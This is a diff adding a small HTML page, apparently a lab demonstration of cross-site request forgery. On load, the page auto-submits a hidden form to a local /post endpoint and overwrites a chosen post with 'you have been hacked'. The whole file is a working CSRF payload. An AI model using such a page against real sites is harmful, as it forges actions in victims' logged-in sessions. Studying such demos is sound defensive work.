@@ -1,0 +1,23 @@
+<html>
+
+<body onload="csrfrun()">
+    <h1>This is a malicious iframe</h1>
+    <form action="http://localhost:8080/post" method="POST">
+        <input type="hidden" id="id" name="id" value="1" />
+        <input type="hidden" name="title" value="you have been hacked" />
+        <input type="hidden" name="post" value="hahahahah!" />
+        <input type="submit" value="Submit" />
+    </form>
+    <script type='text/javascript'>
+        function csrfrun() {
+            const url = new URL(window.location.href);
+            const p = url.searchParams.get("p");
+            if (p) {
+                document.getElementById("id").value = p;
+                document.forms[0].submit();
+            }
+        }
+    </script>
+</body>
+
+</html>
